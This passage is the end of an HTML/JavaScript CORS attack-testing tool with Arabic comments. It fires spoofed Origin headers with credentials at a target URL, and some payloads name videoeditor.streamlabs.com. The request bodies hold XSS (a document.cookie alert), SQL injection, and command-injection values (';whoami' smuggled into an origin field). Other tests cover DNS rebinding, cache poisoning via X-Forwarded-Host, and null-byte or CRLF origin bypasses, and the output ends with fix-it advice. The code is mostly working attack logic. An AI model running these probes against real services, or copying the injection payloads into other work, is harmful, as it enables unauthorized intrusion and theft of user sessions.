                        payload: '<script>alert(document.cookie)</script>'
                    })
                },
                {
                    name: 'CORS + CSRF Chain',
                    origin: 'https://evil.com',
                    headers: {
                        'X-Requested-With': 'XMLHttpRequest',
                        'X-CSRF-Token': 'fake-token'
                    }
                },
                {
                    name: 'CORS + SQLi Chain',
                    origin: 'https://evil.com',
                    body: JSON.stringify({
                        origin: "https://videoeditor.streamlabs.com' OR '1'='1",
                        intent: 'connect',
                        noAuthTarget: 'login'
                    })
                },
                {
                    name: 'CORS + Command Injection',
                    origin: 'https://evil.com',
                    body: JSON.stringify({
                        origin: 'https://videoeditor.streamlabs.com;whoami',
                        intent: 'connect',
                        noAuthTarget: 'login'
                    })
                }
            ];
            
            for (const test of chainedTests) {
                stats.total++;
                const headers = {
                    ...JSON.parse(document.getElementById('customHeaders').value || '{}'),
                    'Origin': test.origin,
                    ...test.headers
                };
                
                const result = await makeRequest(url, {
                    method: 'POST',
                    headers: headers,
                    body: test.body || document.getElementById('requestBody').value,
                    mode: 'cors',
                    credentials: 'include'
                });
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    if (allowOrigin === test.origin || allowOrigin === '*') {
                        log(`🚨 Chained attack possible: ${test.name}`, 'vulnerable', {
                            test: test,
                            response: result.response
                        });
                    }
                }
            }
        }
        
        async function runAllTests() {
            clearResults();
            log('🚀 بدء جميع اختبارات CORS المتقدمة...', 'info');
            
            const tests = [
                { name: 'Basic CORS Test', fn: testBasicCORS },
                { name: 'Origin Manipulation', fn: testOriginManipulation },
                { name: 'Subdomain Attacks', fn: testSubdomainAttacks },
                { name: 'Null Origin', fn: testNullOrigin },
                { name: 'Credentials Testing', fn: testCredentialsInclude },
                { name: 'Preflight Bypass', fn: testPreflightBypass },
                { name: 'Header Injection', fn: testHeaderInjection },
                { name: 'Protocol Downgrade', fn: testProtocolDowngrade },
                { name: 'Wildcard Bypass', fn: testWildcardBypass },
                { name: 'WebSocket CORS', fn: testWebSocketCORS },
                { name: 'Special Characters', fn: testSpecialCharacters },
                { name: 'Regex Bypass', fn: testRegexBypass },
                { name: 'Port Variations', fn: testPortVariations },
                { name: 'Encoding Bypass', fn: testEncodingBypass },
                { name: 'Chained Attacks', fn: testChainedAttacks }
            ];
            
            for (let i = 0; i < tests.length; i++) {
                log(`⏳ ${tests[i].name} (${i + 1}/${tests.length})...`, 'info');
                await tests[i].fn();
                await delay(500); // تأخير بين الاختبارات
            }
            
            // تقرير نهائي
            log('📊 ===== تقرير نهائي =====', 'info');
            log(`✅ إجمالي الاختبارات: ${stats.total}`, 'info');
            log(`🚨 الثغرات المكتشفة: ${stats.vulnerable}`, stats.vulnerable > 0 ? 'vulnerable' : 'success');
            log(`✓ الطلبات الناجحة: ${stats.success}`, 'info');
            log(`✗ الطلبات الفاشلة: ${stats.failed}`, 'info');
            
            if (stats.vulnerable > 0) {
                log('⚠️ تحذير: تم اكتشاف ثغرات CORS! راجع السجلات أعلاه للتفاصيل.', 'vulnerable');
                
                // اقتراحات للإصلاح
                log('💡 اقتراحات الإصلاح:', 'info');
                log('1. تحديد قائمة بيضاء صارمة للـ Origins المسموح بها', 'info');
                log('2. عدم استخدام wildcard (*) مع credentials', 'info');
                log('3. التحقق من Origin بشكل صارم وليس بـ regex ضعيف', 'info');
                log('4. عدم الثقة في Origin header القادم من العميل', 'info');
                log('5. استخدام HTTPS دائماً', 'info');
            } else {
                log('🎉 ممتاز! لم يتم اكتشاف ثغرات CORS واضحة.', 'success');
            }
            
            updateProgress(100, 100);
        }
        
        // إضافة اختبارات متقدمة إضافية
        async function testAdvancedTechniques() {
            log('🎭 بدء التقنيات المتقدمة...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const baseHeaders = JSON.parse(document.getElementById('customHeaders').value || '{}');
            
            // 1. DNS Rebinding Attack Simulation
            log('🔍 اختبار DNS Rebinding...', 'info');
            const dnsRebindingOrigins = [
                'http://localhost.evil.com',
                'http://127.0.0.1.evil.com',
                'http://0.0.0.0.evil.com',
                'http://[::1].evil.com'
            ];
            
            for (const origin of dnsRebindingOrigins) {
                stats.total++;
                const result = await makeRequest(url, {
                    method: document.getElementById('method').value,
                    headers: { ...baseHeaders, 'Origin': origin },
                    mode: 'cors',
                    credentials: 'include'
                });
                
                if (result.success && result.response.headers['access-control-allow-origin']) {
                    log(`🚨 DNS Rebinding vulnerability: ${origin}`, 'vulnerable');
                }
            }
            
            // 2. Cache Poisoning via CORS
            log('🔍 اختبار Cache Poisoning...', 'info');
            const cacheHeaders = {
                ...baseHeaders,
                'Origin': 'https://evil.com',
                'Cache-Control': 'max-age=3600',
                'X-Forwarded-Host': 'evil.com',
                'X-Forwarded-Proto': 'https'
            };
            
            stats.total++;
            const cacheResult = await makeRequest(url, {
                method: 'GET',
                headers: cacheHeaders,
                mode: 'cors'
            });
            
            if (cacheResult.success) {
                const cacheControl = cacheResult.response.headers['cache-control'];
                const allowOrigin = cacheResult.response.headers['access-control-allow-origin'];
                
                if (cacheControl && allowOrigin === 'https://evil.com') {
                    log('🚨 Cache poisoning عبر CORS ممكن!', 'vulnerable', {
                        'cache-control': cacheControl,
                        'allow-origin': allowOrigin
                    });
                }
            }
            
            // 3. Browser Quirks Testing
            log('🔍 اختبار Browser Quirks...', 'info');
            const browserQuirks = [
                { origin: 'https://evil.com\x00.trusted.com' },
                { origin: 'https://evil.com\x0d.trusted.com' },
                { origin: 'https://evil.com\x0a.trusted.com' },
                { origin: 'https://evil.com%00.trusted.com' },
                { origin: 'https://evil.com\t.trusted.com' },
                { origin: 'https://evil.com .trusted.com' }
            ];
            
            for (const quirk of browserQuirks) {
                stats.total++;
                try {
                    const result = await makeRequest(url, {
                        method: document.getElementById('method').value,
                        headers: { ...baseHeaders, 'Origin': quirk.origin },
                        mode: 'cors',
                        credentials: 'include'
                    });
                    
                    if (result.success) {
                        log(`⚠️ Browser quirk exploitation: ${quirk.origin}`, 'warning');
                    }
                } catch (e) {
                    // Expected in most cases
                }
            }
            
            // 4. Time-based Analysis
            log('🔍 اختبار Time-based Analysis...', 'info');
            const timingOrigins = ['https://trusted.com', 'https://evil.com'];
            const timingResults = {};
            
            for (const origin of timingOrigins) {
                const startTime = performance.now();
                stats.total++;
                
                await makeRequest(url, {
                    method: document.getElementById('method').value,
                    headers: { ...baseHeaders, 'Origin': origin },
                    mode: 'cors',
                    credentials: 'include'
                });
                
                const endTime = performance.now();
                timingResults[origin] = endTime - startTime;
            }
            
            const timeDiff = Math.abs(timingResults['https://trusted.com'] - timingResults['https://evil.com']);
            if (timeDiff > 100) {
                log(`⚠️ فرق زمني كبير بين الطلبات: ${timeDiff}ms`, 'warning', timingResults);
            }
            
            // 5. HTTP/2 and HTTP/3 Specific Tests
            log('🔍 اختبار HTTP/2 و HTTP/3...', 'info');
            if (window.chrome && window.chrome.loadTimes) {
                const connectionInfo = window.chrome.loadTimes();
                log(`ℹ️ معلومات الاتصال: ${JSON.stringify(connectionInfo)}`, 'info');
            }
            
            // 6. Service Worker Bypass
            log('🔍 اختبار Service Worker Bypass...', 'info');
            if ('serviceWorker' in navigator) {
                try {
                    const registration = await navigator.serviceWorker.register('data:text/javascript,', { scope: '/' });
                    log('⚠️ Service Worker registration ممكن - قد يتجاوز CORS', 'warning');
                    await registration.unregister();
                } catch (e) {
                    log('✅ Service Worker registration محمي', 'success');
                }
            }
            
            // 7. Shared Array Buffer Test
            log('🔍 اختبار SharedArrayBuffer...', 'info');
            if (typeof SharedArrayBuffer !== 'undefined') {
                log('⚠️ SharedArrayBuffer متاح - تحقق من Cross-Origin-Embedder-Policy', 'warning');
            }
            
            // 8. Custom Protocol Handler
            log('🔍 اختبار Custom Protocol Handler...', 'info');
            const customProtocols = [
                'web+streamlabs://evil.com',
                'streamlabs://evil.com',
                'app://evil.com'
            ];
            
            for (const protocol of customProtocols) {
                stats.total++;
                try {
                    await makeRequest(url, {
                        method: document.getElementById('method').value,
                        headers: { ...baseHeaders, 'Origin': protocol },
                        mode: 'cors'
                    });
                    log(`⚠️ Custom protocol accepted: ${protocol}`, 'warning');
                } catch (e) {
                    // Expected
                }
            }
            
            log('✅ اكتملت الاختبارات المتقدمة', 'success');
        }
        
        // Event listeners for keyboard shortcuts
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey || e.metaKey) {
                switch(e.key) {
                    case 'Enter':
                        e.preventDefault();
                        runAllTests();
                        break;
                    case 's':
                        e.preventDefault();
                        exportResults();
                        break;
                    case 'l':
                        e.preventDefault();
                        clearResults();
                        break;
                }
            }
        });
        
        // Auto-save settings to localStorage
        function saveSettings() {
            const settings = {
                targetUrl: document.getElementById('targetUrl').value,
                method: document.getElementById('method').value,
                requestBody: document.getElementById('requestBody').value,
                customHeaders: document.getElementById('customHeaders').value,
                delay: document.getElementById('delay').value
            };
            localStorage.setItem('corsTestSettings', JSON.stringify(settings));
        }
        
        function loadSettings() {
            const saved = localStorage.getItem('corsTestSettings');
            if (saved) {
                const settings = JSON.parse(saved);
                document.getElementById('targetUrl').value = settings.targetUrl || '';
                document.getElementById('method').value = settings.method || 'POST';
                document.getElementById('requestBody').value = settings.requestBody || '';
                document.getElementById('customHeaders').value = settings.customHeaders || '{}';
                document.getElementById('delay').value = settings.delay || '100';
            }
        }
        
        // Save settings on change
        document.querySelectorAll('input, textarea, select').forEach(element => {
            element.addEventListener('change', saveSettings);
        });
        
        // Load settings on page load
        window.addEventListener('load', loadSettings);
        
        // Display keyboard shortcuts
        log('⌨️ اختصارات لوحة المفاتيح:', 'info');
        log('Ctrl+Enter: تشغيل جميع الاختبارات', 'info');
        log('Ctrl+S: تصدير النتائج', 'info');
        log('Ctrl+L: مسح النتائج', 'info');
    </script>
</body>
</html>
